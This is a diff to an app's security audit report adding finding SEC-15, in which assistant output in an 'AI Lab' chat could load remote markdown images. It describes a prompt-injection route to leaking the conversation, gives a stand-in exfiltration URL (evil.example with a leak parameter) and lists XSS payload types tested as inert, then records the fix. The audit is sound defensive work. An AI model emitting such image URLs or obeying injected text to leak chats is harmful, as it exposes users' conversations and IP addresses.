@@ -19,6 +19,7 @@ Scope, method and threat model: see `THREAT_MODEL.md` (Part 2). Local test stack
 | SEC-12 | Low | Database / privileges | The service runs as the schema owner; the ledger writer resolved names through the caller's `search_path` and any role could execute it; no least-privilege role existed | **Fixed** (branch `security/audit-fixes-a`) — migration 012; app-role split ready, switching is an owner decision |
 | SEC-13 | Low | Webhook / payments | A signed `order_created` was credited without checking test mode, store or a present currency | **Fixed** (branch `security/audit-fixes-a`) |
 | SEC-14 | Low | Webhook / payments | Lemon refunds were invisible: credits of a refunded order stayed and nothing recorded or reported it | **Fixed** (branch `security/audit-fixes-b`) — recorded and reported for manual review (no automatic claw-back, owner decision) |
+| SEC-15 | Low | AI Lab / output | Model output could make the browser load any remote image (markdown image) — conversation exfiltration / tracking via prompt injection | **Fixed** (branch `security/audit-fixes-b`) |
 
 ---
 
@@ -412,3 +413,27 @@ Evidence is the named test, or the code reference where a test would only restat
   `db:reconcile` can now exit 2 for unreviewed refunds.
 * **Open:** chargebacks without an `order_refunded` (undocumented) — check the Lemon dashboard's disputes in the
   weekly review.
+
+## SEC-15 — Low — Remote images in AI output were loaded automatically
+
+* **Where:** `src/components/ai/ChatMessageContent.tsx` (assistant messages).
+* **Weakness:** the renderer (react-markdown → remark-math → rehype-katex → rehype-sanitize) allowed `img` with
+  `https:` sources, so a model answer containing `![x](https://host/p.gif?q=…)` made every viewer's browser
+  request that URL. Model output is attacker-influenced whenever the user pastes crafted text ("paste this prompt
+  into the AI Lab"): the injected instruction can make the model put the conversation into the URL — the classic
+  markdown-image exfiltration channel — and it reveals the viewer's IP to the host. Low: the only data in reach is
+  the user's own conversation, and the user has to paste the injection themselves.
+* **Repro:** `tests/unit/ai/chat-output-rendering.test.tsx` — "markdown image to a third party": an `<img
+  src="https://evil.example/p.gif?leak=chat">` was rendered.
+* **Fix:** images in assistant output render as a link `[image: alt]` (http/https only, `target=_blank`,
+  `rel="noopener noreferrer"`); nothing is fetched unless the user clicks. The CSP (frontend part of 2B) adds
+  `img-src` as a second layer.
+* **Verified inert (same test, 19 payloads):** raw `<script>`, `<img onerror>`, `<svg onload>`, `<iframe>`,
+  `<style>`, `<form>`, `javascript:` / `vbscript:` / `data:` links (inline, reference, autolink, entity-obfuscated),
+  `javascript:` images, KaTeX `\href` / `\url` / `\htmlStyle` / `\htmlClass`, HTML inside code fences. Raw HTML
+  is never parsed (no `rehype-raw`); sanitize runs last, so even KaTeX's output is sanitized. User messages are
+  plain text.
+* **Info (owner decision, not changed):** because sanitize runs after KaTeX with the default schema, KaTeX's
+  classes and MathML are stripped and maths in answers renders as garbled plain text. Making it render needs either
+  sanitize-before-KaTeX (KaTeX's own output then becomes trusted; `trust` stays off) or a schema that allows
+  KaTeX's classes, inline `style` and MathML. Both widen what model output can produce — a deliberate choice.
